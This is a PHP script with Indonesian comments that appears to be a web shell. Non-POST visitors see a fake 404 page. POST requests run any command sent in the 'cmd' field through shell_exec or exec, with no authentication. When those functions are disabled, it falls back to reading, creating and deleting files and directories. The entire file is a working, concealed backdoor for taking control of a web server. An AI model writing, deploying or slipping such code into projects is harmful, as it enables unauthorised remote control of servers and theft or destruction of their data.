<?php
// Cek jika bukan request POST, kembalikan 404
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('HTTP/1.1 404 Not Found');
    echo '<h1>404 Not Found</h1>';
    echo 'The page you are looking for could not be found.';
    exit;
}

session_start(); // Mulai sesi untuk menyimpan direktori saat ini

// Jika tidak ada cmd, kembalikan direktori saat ini
if (!isset($_POST['cmd'])) {
    if (!isset($_SESSION['current_dir'])) {
        $_SESSION['current_dir'] = getcwd();
    }
    // Validasi direktori sesi
    if (!is_dir($_SESSION['current_dir']) || !is_readable($_SESSION['current_dir'])) {
        $error = "Direktori sesi awal tidak valid atau tidak readable: " . $_SESSION['current_dir'];
        echo $error;
        error_log($error);
        exit;
    }
    echo $_SESSION['current_dir'];
    exit;
}

$cmd = $_POST['cmd'];

// Jika belum ada direktori di sesi, set ke direktori awal
if (!isset($_SESSION['current_dir'])) {
    $_SESSION['current_dir'] = getcwd();
}

// Ubah ke direktori yang tersimpan di sesi
if (!chdir($_SESSION['current_dir'])) {
    $error = "Gagal mengakses direktori sesi: " . $_SESSION['current_dir'] . ". Cek izin atau path.";
    echo $error;
    error_log($error);
    exit;
}

// Debug: Tampilkan direktori saat ini di awal output
$current_dir = getcwd();
$output_prefix = "Current dir: $current_dir\n";

// Cek jika direktori readable
if (!is_readable($current_dir)) {
    $error = $output_prefix . "Direktori tidak readable! Cek izin untuk '$current_dir'.";
    echo $error;
    error_log($error);
    exit;
}

if ($cmd === 'cd') {
    if (isset($_POST['path'])) {
        $path = $_POST['path'];
        // Ganti backslash ke slash untuk konsistensi di Windows
        $path = str_replace('\\', '/', $path);
        // Coba realpath untuk path absolut
        $real_path = realpath($path);
        if ($real_path === false || !is_dir($real_path)) {
            $error = "Gagal pindah ke direktori '$path'! Path tidak valid atau bukan direktori.";
            echo $error;
            error_log($error);
        } elseif (!is_readable($real_path)) {
            $error = "Gagal pindah ke direktori '$path'! Tidak ada izin baca.";
            echo $error;
            error_log($error);
        } elseif (chdir($real_path)) {
            $_SESSION['current_dir'] = getcwd(); // Simpan direktori baru ke sesi
            echo getcwd();
        } else {
            $error = "Gagal pindah ke direktori '$path'! Kesalahan tidak diketahui.";
            echo $error;
            error_log($error);
        }
    } else {
        echo "Path tidak diberikan!";
    }
} else {
    // Normalisasi perintah ls/dir untuk konsistensi
    $cmd_parts = explode(' ', $cmd);
    $command = $cmd_parts[0];
    $arg = isset($cmd_parts[1]) ? $cmd_parts[1] : '';

    if ($command === 'ls' || $command === 'dir') {
        // Jika ada argumen (misal 'ls img'), override ke direktori argumen
        $target_dir = $arg ? realpath($arg) : $current_dir;
        if ($arg && ($target_dir === false || !is_dir($target_dir))) {
            $error = $output_prefix . "Direktori '$arg' tidak valid atau bukan direktori!";
            echo $error;
            error_log($error);
            exit;
        }
        if ($arg && !is_readable($target_dir)) {
            $error = $output_prefix . "Direktori '$arg' tidak readable! Cek izin.";
            echo $error;
            error_log($error);
            exit;
        }
        // Ganti perintah ls/dir ke native OS, tanpa argumen untuk direktori saat ini
        $is_windows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
        $cmd = $arg ? ($is_windows ? "dir \"$arg\"" : "ls \"$arg\"") : ($is_windows ? "dir" : "ls");
    }

    // Coba shell_exec sebagai opsi utama
    if (function_exists('shell_exec')) {
        $output = shell_exec($cmd);
        if ($output === null) {
            echo $output_prefix . "Perintah gagal atau tidak ada output!";
        } else {
            echo $output_prefix . $output;
        }
    } 
    // Jika shell_exec dinonaktifkan, coba exec
    elseif (function_exists('exec')) {
        $output = [];
        $return_var = 0;
        exec($cmd, $output, $return_var);
        if ($return_var === 0 && !empty($output)) {
            echo $output_prefix . implode("\n", $output);
        } else {
            echo $output_prefix . "Perintah gagal atau tidak ada output!";
        }
    } 
    // Jika keduanya mati, fallback ke fungsi PHP bawaan
    else {
        $fallback_output = '';
        switch ($command) {
            case 'ls':
            case 'dir':
                $dir = scandir($arg ? $target_dir : $current_dir); // Pakai direktori target
                if ($dir === false) {
                    $fallback_output = "Gagal membaca direktori '" . ($arg ? $target_dir : $current_dir) . "'! Cek izin.";
                } else {
                    $files = array_diff($dir, ['.', '..']);
                    sort($files); // Urutkan untuk konsistensi
                    $fallback_output = implode("\n", $files);
                }
                break;
            case 'mkdir':
                if ($arg && mkdir($arg)) {
                    $fallback_output = "Direktori '$arg' berhasil dibuat!";
                } else {
                    $fallback_output = "Gagal membuat direktori atau argumen tidak diberikan! Cek izin.";
                }
                break;
            case 'rmdir':
                if ($arg && rmdir($arg)) {
                    $fallback_output = "Direktori '$arg' berhasil dihapus!";
                } else {
                    $fallback_output = "Gagal menghapus direktori atau argumen tidak diberikan! Cek izin.";
                }
                break;
            case 'touch':
                if ($arg && touch($arg)) {
                    $fallback_output = "File '$arg' berhasil dibuat!";
                } else {
                    $fallback_output = "Gagal membuat file atau argumen tidak diberikan! Cek izin.";
                }
                break;
            case 'cat':
                if ($arg && file_exists($arg)) {
                    $fallback_output = file_get_contents($arg);
                } else {
                    $fallback_output = "File tidak ditemukan atau argumen tidak diberikan!";
                }
                break;
            case 'rm':
                if ($arg && file_exists($arg) && unlink($arg)) {
                    $fallback_output = "File '$arg' berhasil dihapus!";
                } else {
                    $fallback_output = "Gagal menghapus file atau argumen tidak diberikan! Cek izin.";
                }
                break;
            default:
                $fallback_output = "Fungsi shell dinonaktifkan dan perintah tidak didukung!";
                break;
        }
        echo $output_prefix . $fallback_output;
    }
}
?>
